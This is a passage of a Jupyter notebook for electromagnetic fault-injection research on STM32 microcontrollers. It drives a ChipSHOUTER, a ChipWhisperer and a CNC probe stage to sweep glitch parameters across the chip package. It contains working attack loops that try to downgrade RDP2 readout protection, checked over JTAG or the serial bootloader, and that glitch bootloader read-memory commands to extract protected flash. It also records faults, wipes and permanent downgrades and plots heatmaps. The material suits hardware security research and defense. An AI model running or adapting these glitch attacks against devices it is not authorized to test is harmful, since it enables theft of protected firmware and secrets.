# Calculate the number of points needed so that the interval is divided by the step size
x_points = round((CNC_X_MAX - CNC_X_MIN) / CNC_STEP) + 1
y_points = round((CNC_Y_MAX - CNC_Y_MIN) / CNC_STEP) + 1

#### Core glitch loop

In [ ]:
# Initialize array to store results
expdata = np.zeros((len(RESULT),(glitch_voltage_end-glitch_voltage_start)+1,(glitch_width_end-glitch_width_start)+1,(glitch_offset_end-glitch_offset_start)+1,round(PACKAGE_X/CNC_STEP)+1,round(PACKAGE_Y/CNC_STEP)+1), dtype='uint32')
total = 0

In [ ]:
# Initialize current probe position to allow for restarts
x_current = CNC_X_MIN
y_current = CNC_Y_MIN

#x_current = 8.5
#y_current = 9.0

if DEVICE.startswith("STM32F4"):
    pcrop_default = test_pcrop_read()
    print(pcrop_default)

In [ ]:
print(f"{DEVICE} Glitch Characterization")
print(datetime.now())
print("Scan type: %s" % SCAN_TYPE)
print("Probe type: %s %s" % (PROBE_SIZE, PROBE_WINDING))
print("Positioning: %s" % POSITION_TYPE)
print("Voltage range: %d, %d" % (glitch_voltage_start, glitch_voltage_end))
print("Width range: %d, %d" % (glitch_width_start, glitch_width_end))
print("Offset range: %d, %d" % (glitch_offset_start, glitch_offset_end))
print("CLKGEN freq: %d MHz" % (int(scope.clock.clkgen_freq / 1e6)))
print(f"Package size: {PACKAGE_X} x {PACKAGE_Y}")
print(f"X range: {CNC_X_MIN}, {CNC_X_MAX}")
print(f"Y range: {CNC_Y_MIN}, {CNC_Y_MAX}")
print(f"Step size: {CNC_STEP}")
print(f"Tries per V: {GLITCH_TRIES}")
if DEVICE.startswith("STM32F4"):
    print(f"Default response: {pcrop_default}")
print()

scope.scopetype.usart.init(115200, stopbits=1, parity="even")
stbl = StmBl(scope.scopetype.usart, debug=False)

stop = False

cs_init()
arm_cs(glitch_voltage_start)

for x_coord in np.round(np.linspace(CNC_X_MIN, CNC_X_MAX, x_points), decimals=1):
    if stop:
        break

    if x_coord < x_current:  # Skip until restart position is reached
        continue
    
    for y_coord in np.round(np.linspace(CNC_Y_MIN, CNC_Y_MAX, y_points), decimals=1):
        if stop:
            break

        if x_coord == x_current and y_coord < y_current:  # Skip until restart position is reached, first iteration only
           continue
        
        # Move to the next position (absolute coordinates relative to the defined origin)
        if POSITION_TYPE == "Automatic":
            x_current = x_coord
            y_current = y_coord

            if CNC_TYPE == "Generic":
                cnc_success = cnc_send_command(f"G0 X{x_coord} Y{y_coord} Z0")
                
                if not cnc_success:
                    print('CNC SERIAL ERROR')
                    stop = True
                    break
                    
                time.sleep(0.25)  # Wait for CNC to finish move
            
                if y_coord == CNC_Y_MIN:
                    time.sleep(1)   # Wait additional time for CNC to finish move back to axis origin        

            elif CNC_TYPE == "Shover":
                shv.move(x=x_coord, y=y_coord)

            else:
                raise ValueError("Unsupported CNC type.")
                
        for gvoltage in range(glitch_voltage_start, glitch_voltage_end + 1, 5):
            if stop:
                break

            r = cs.trigger_safe   # Read ChipSHOUTER temperature sensors every so often to avoid fault

            for tries in range(GLITCH_TRIES):
                if stop:
                    break
                    
                try:
                    total += 1
                    r = cs.trigger_safe
                    
                    gwidth = random.randint(glitch_width_start, glitch_width_end)
                    goffset = random.randint(glitch_offset_start, glitch_offset_end)
                    
                    cs.voltage = gvoltage
                    scope.glitch.repeat = gwidth
                    scope.glitch.ext_offset = goffset

                    sys.stdout.write(f"\rX: {x_coord}, Y: {y_coord}, Voltage: {gvoltage}, Try: {tries+1}, Width: {gwidth}, Offset: {goffset}    ")
                    sys.stdout.flush()   # Force update without newlines        

                    if SCAN_TYPE == "Test":    # Test Code
                        reset_dut_thorough()
                        scope.arm()  
                        scope.scopetype.usart.write(b'D')
                        time.sleep(0.05)
                        r = bytes(scope.scopetype.usart.read())
                    
                        if r == b'2500 50 50 0\n':
                            #print('normal:', r)
                            expdata[RESULT.NORMAL, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                        elif b'Hello' in r:
                            #print('reset:', r)
                            expdata[RESULT.RESET, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                        elif r == b'' or r == b'\x00':
                            #print('crash:', r)
                            expdata[RESULT.CRASH, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                            reset_dut_thorough()
                        else:
                            print('fault:', r)
                            expdata[RESULT.FAULT, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                            reset_dut_thorough()         
                    
                        res = scope.capture(poll_done=True)
                        if res:
                            reset_dut_thorough()

                    elif SCAN_TYPE == "RDP_JTAG":  # RDP2 Downgrade: JTAG
                        scope.io.pdic = True            # Set BOOT0 HIGH to enter STM32 Serial Bootloader
                        stm32_pwr_cycle(True)           # Power cycle target and arm ChipWhisperer
                        scope.capture(poll_done=True)   # Capture trace
                        time.sleep(0.05)                # Allow target time to initialize
    
                        id = pylink_idcode()            # Attempt to read JTAG IDCODE                
                        if (id != '0xffffffff' and id != '0x0'):
                            #print(datetime.now())
                            print(f"\n\rGlitch! X: {x_coord}, Y: {y_coord}, Voltage: {gvoltage}, Width: {gwidth}, Offset: {goffset}")
                            print("JTAG IDCODE: " + id, end="\r\n")
            
                            try:
                                # It's possible to successfully downgrade, but not have access to the STM32 Serial Bootloader
                                # Attempt to connect to the bootloader to verify
                                reconnect()
                                a, b, c = stbl.get_version()
                                print('Version: 0x%02x, option 1: %d, option 2: %d' %(a,b,c))
                                expdata[RESULT.FAULT, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                                downgrade_voltage = gvoltage
                                downgrade_offset = goffset
                                downgrade_width = gwidth
                                cnc_downgrade_x = x_coord
                                cnc_downgrade_y = y_coord
                                #stop = True
                                #break
                    
                            except Exception as e:
                                #print(e)
                                #print()
                                expdata[RESULT.WEIRD, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                                pass
                            
                            if DEVICE.startswith("STM32F4"):
                                jlink.set_tif(pylink.enums.JLinkInterfaces.SWD)   # Set Target Interface as SWD
                                jlink.connect('STM32F427VG')                      # Connect to STM32
                                #print("SWD IDCODE: " + hex(jlink.core_id()))      # Confirm that we are successfully connected
                                print(f"FLASH_OPTCR: 0x{jlink.memory_read32(0x40023C14, 1)[0]:08x}")                                
                                print(f"FLASH_OPTCR1: 0x{jlink.memory_read32(0x40023C18, 1)[0]:08x}")

                            print()
                            #stop = True
                            #break

                        else:
                            expdata[RESULT.NORMAL, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
    
                    elif SCAN_TYPE == "RDP_BL":    # RDP2 Downgrade: STM32 Serial Bootloader
                        scope.io.pdic = True            # Set BOOT0 HIGH to enter STM32 Serial Bootloader
                        stm32_pwr_cycle(True)           # Power cycle target and arm ChipWhisperer
                        scope.capture(poll_done=True)   # Capture trace
                        time.sleep(0.05)                # Allow target time to initialize
    
                        try:
                            reconnect()
    
                        except Exception as e:
                            #print(e)
                            expdata[RESULT.NORMAL, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                        
                        else:
                            a, b, c = stbl.get_version()
                            print('Version: 0x%02x, option 1: %d, option 2: %d' %(a,b,c))
                            expdata[RESULT.FAULT, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                            downgrade_voltage = gvoltage
                            downgrade_offset = goffset
                            downgrade_width = gwidth
                            cnc_downgrade_x = x_coord
                            cnc_downgrade_y = y_coord
                            #stop = True
                            #break

                    elif SCAN_TYPE == "BL":   # STM32 Serial Bootloader Command
                        scope.io.pdic = True            # Set BOOT0 HIGH to enter STM32 Serial Bootloader
                        stm32_pwr_cycle(False)          # Power cycle target to recover if crashed
                        reconnect()
                            
                        ret = scope.scopetype.usart.read()
                        send_bl_command()
                        time.sleep(0.05)
                        scope.capture(poll_done=True)
                        ret = scope.scopetype.usart.read()

                        #if len(ret) > 0 and ret[0] != stbl.nack:  # If response is not NACK
                        if len(ret) > 0 and ret[0] != stbl.nack and b'Hello' not in ret:
                            print()
                            print(bytes(ret).hex())
                    
                        if len(ret) > 0 and ret[0] == stbl.ack:   # 1st ACK
                            scope.scopetype.usart.write(addr)        # Send starting address to read
                            time.sleep(0.05)
                            r = scope.scopetype.usart.read(1)
                            
                            if len(r) > 0 and r[0] == stbl.ack:   # 2nd ACK
                                scope.scopetype.usart.write(bytes([nbytes-1, checksum(nbytes-1)]))   # Send number of bytes to read
                                ret = bytearray(scope.scopetype.usart.read(nbytes+1))
    
                                if len(ret) > 0 and ret[0] == stbl.ack:   # 3rd ACK                            
                                    expdata[RESULT.FAULT, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                                    print("Read success! " + ret.hex(sep=' '))
                                    print()
                                else:
                                    expdata[RESULT.NORMAL, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
    
                            else:
                                expdata[RESULT.NORMAL, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1

                        else:
                            expdata[RESULT.NORMAL, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1

                    else:
                        raise ValueError("Unsupported scan type.")

                    """
                    # Detect if the target device was wiped while using the previous parameters
                    reset_dut()
                    r1 = scope.scopetype.usart.read()
                    scope.scopetype.usart.write(b'D')
                    time.sleep(0.05)
                    r2 = scope.scopetype.usart.read()
                
                    if (b'Hello' in r1) or (b'2500 50 50' in r2):
                        pass
                    else:
                        print('\nTarget device has been wiped!', gvoltage, gwidth, goffset)
                        print(bytes(r1), bytes(r2))
                        # wipe
                        expdata[RESULT.WIPE, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                        reprogram()   # Reload test code so the glitch loop can continue running properly
                        #stop = True
                        #break
                    """
                
                    if DEVICE.startswith("STM32F4"):
                        # Detect if the target device was wiped or PCROP-specific values corrupted while using the previous parameters
                        pcrop = test_pcrop_read()
                    
                        if (b'Hello' not in pcrop[0]) and pcrop[1] != 16:
                            print('Target device has been wiped!', gvoltage, gwidth, goffset, x_coord, y_coord)
                            print(pcrop)
                            # wipe
                            expdata[RESULT.WIPE, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                            #stop = True
                            #break  # Stop so we can verify if it's a true wipe
                            downgrade()
                            reprogram_rdp2()
                            pcrop_default = test_pcrop_read()
                        """    
                        elif pcrop[-4:] != pcrop_default[-4:]: # If the last 4 elements are different (option bytes, FLASH_OPTCR registers)
                            print('PCROP corrupted!', gvoltage, gwidth, goffset, x_coord, y_coord)
                            print(pcrop)
                            print(pcrop_default)
                            # pcrop
                            expdata[RESULT.PCROP, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                            #stop = True
                            #break
                            #downgrade()
                            #reprogram_rdp2()
                            pcrop_default = test_pcrop_read()           
                        """
                        
                        if 'cc' not in pcrop[4]:
                            print('Permanent downgrade!', gvoltage, gwidth, goffset, x_coord, y_coord)
                            stop = True
                            break
                            
                except Exception as message:
                    message = str(message)
                    print()
                    print(message)
                    if "LIBUSB_ERROR" in message:
                        stop = True
                        break
                    else:
                        pass
                
                except KeyboardInterrupt:
                    stop = True
                    break    

                if total % 10000 == 0:
                    # Save results
                    np.save(f'./output/{DEVICE.lower()}_{SCAN_TYPE.lower()}_{PROBE_SIZE.lower()}_{PROBE_WINDING.lower()}_step_{CNC_STEP}_expdata.npy', expdata)
                    
                if (cs.faults_current):
                    if SCAN_TYPE == "BL":
                        # weird
                        expdata[RESULT.WEIRD, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                    print(cs.faults_current)
                    cs_reconnect()
                    arm_cs(gvoltage)
            
print("\nDone!")
print(datetime.now())
scope.io.nrst = 'high_z'
cs.armed = False    # Disarm ChipSHOUTER

In [ ]:
# Display summary
print('# attempts:', total)
print('# faults:', np.sum(expdata[RESULT.FAULT,:,:,:]))
print('# weirds:', np.sum(expdata[RESULT.WEIRD,:,:,:]))
print('# normal:', np.sum(expdata[RESULT.NORMAL,:,:,:]))

if SCAN_TYPE == "Test":
    print('# resets:', np.sum(expdata[RESULT.RESET,:,:,:]))
    print('# crashes:', np.sum(expdata[RESULT.CRASH,:,:,:]))

if DEVICE.startswith("STM32F4"):
    print('# wipes:', np.sum(expdata[RESULT.WIPE,:,:,:]))
    print('# pcrop enabled:', np.sum(expdata[RESULT.PCROP,:,:,:]))

In [ ]:
# Save results (optional)
np.save(f'./output/{DEVICE.lower()}_{SCAN_TYPE.lower()}_{PROBE_SIZE.lower()}_{PROBE_WINDING.lower()}_step_{CNC_STEP}_expdata.npy', expdata)

In [ ]:
# Load results (optional)
expdata = np.load(f'./output/{DEVICE.lower()}_{SCAN_TYPE.lower()}_{PROBE_SIZE.lower()}_{PROBE_WINDING.lower()}_step_{CNC_STEP}_expdata.npy')

## Data Analysis

In [ ]:
# Create a heatmap plot based on the provided dataset
def plot_heatmap(expdata, result_type, vmax, cmap, title):
    sub_data = expdata[result_type, :, :, :, :, :]     # Extract x and y data
    heatmap_data = np.sum(sub_data, axis=(0, 1, 2))    # Sum over glitch-related axes to retain (x_points, y_points)

    # Define axis labels based on CNC step size
    x_coords = np.arange(heatmap_data.shape[0]) * CNC_STEP
    y_coords = np.arange(heatmap_data.shape[1]) * CNC_STEP

    # Set colormap range
    vmin = 0 
    vmax = vmax

    # Plot heatmap
    plt.figure(figsize=(10, 6), dpi=300)
    extent = [x_coords[0], x_coords[-1], y_coords[0], y_coords[-1]]  # Ensures bin alignment
    heatmap_image = plt.imshow(heatmap_data.T, extent=extent, origin='lower', cmap=cmap, interpolation='none', aspect='auto', vmin=vmin, vmax=vmax)

    # Add color bar
    cbar = plt.colorbar(heatmap_image)
    cbar.locator = MaxNLocator(integer=True)  # Use MaxNLocator to enforce integer ticks
    cbar.update_ticks()
    
    # Invert y-axis
    plt.gca().invert_yaxis()
    
    # Set axis labels
    plt.xlabel('X Coordinate')
    plt.ylabel('Y Coordinate')

    # Add minor ticks
    ax = plt.gca()
    ax.xaxis.set_minor_locator(AutoMinorLocator())  # Automatic minor ticks for X-axis
    ax.yaxis.set_minor_locator(AutoMinorLocator())  # Automatic minor ticks for Y-axis
    ax.tick_params(axis='both', which='major', length=10, width=1)  # Customize major ticks
    ax.tick_params(axis='both', which='minor', length=5, width=1)  # Customize minor ticks

    # Add grid lines (optional)
    plt.grid(color='gray', linestyle='-', linewidth=0.25, which='major')  # Major grid lines
    plt.grid(color='gray', linestyle=':', linewidth=0.25, which='minor')  # Minor grid lines
    
    # Adjust location of the dot to reflect pin 1 of the target device
    #plt.annotate('•', xy=(-0.075, 0.955),  xycoords='axes fraction', fontsize=40, color='green')  # Upper left
    #plt.annotate('•', xy=(+1.00, 0.955),   xycoords='axes fraction', fontsize=40, color='green')  # Upper right
    #plt.annotate('•', xy=(-0.075, -0.075), xycoords='axes fraction', fontsize=40, color='green')  # Lower left
    plt.annotate('•', xy=(+1.01, -0.075),  xycoords='axes fraction', fontsize=40, color='green')  # Lower right

    # Add title
    titlelabel = get_legend(result_type)
    plt.title(f'{title}: {titlelabel.capitalize()}, {PROBE_SIZE} {PROBE_WINDING}, Step {CNC_STEP}')

    # Save plot
    plt.savefig(f'./output/{title} {titlelabel.capitalize()} {PROBE_SIZE} {PROBE_WINDING} Step {CNC_STEP} (Heatmap).png', dpi=300, bbox_inches='tight', facecolor='white', edgecolor='white')
    plt.show()

In [ ]:
vmax = 5 #GLITCH_TRIES    # Clip to the highest intensity color
#cmap = 'viridis'
#cmap = 'plasma'
cmap = 'hot'

if SCAN_TYPE == "Test":
    title = f'{DEVICE} Test Code'
elif SCAN_TYPE == "RDP_JTAG":
    title = f'{DEVICE} RDP JTAG Downgrade'
elif SCAN_TYPE == "RDP_BL":
    title = f'{DEVICE} RDP BL Downgrade'
elif SCAN_TYPE == "BL":
    title = f'{DEVICE} BL Command'
else:
    raise ValueError("Unsupported scan type.")   

plot_heatmap(expdata, RESULT.FAULT, vmax, cmap, title)
plot_heatmap(expdata, RESULT.WEIRD, vmax, cmap, title)
#plot_heatmap(expdata, RESULT.WIPE, vmax, cmap, title)

#if DEVICE.startswith("STM32F4"):
#    plot_heatmap(expdata, RESULT.PCROP, vmax, cmap, title)

In [ ]:
 # Move to desired target area (optional)
x_coord = 8.5
y_coord = 9.0

if CNC_TYPE == "Generic":
    cnc_send_command(f"G1 X{x_coord} Y{y_coord} Z0 F100")

elif CNC_TYPE == "Shover":
    shv.move(x=x_coord, y=y_coord)

else:
    raise ValueError("Unsupported CNC type.")

In [ ]:
# Return to zero
if CNC_TYPE == "Generic":
    cnc_send_command("G1 X0 Y0 Z0 F100") 
    
elif CNC_TYPE == "Shover":
    shv.home()

else:
    raise ValueError("Unsupported CNC type.")

## Clean up

In [ ]:
cs.armed = False                  # Disarm ChipSHOUTER
scope.io.target_pwr = False       # Power off target via CW +3.3V

In [ ]:
try:
    jlink.close()     # Close Segger J-Link
except NameError:
    pass

scope.dis()       # Close ChipWhisperer
cs.disconnect()   # Close ChipSHOUTER
cnc.close         # Close CNC Milling Machine

print("Done!")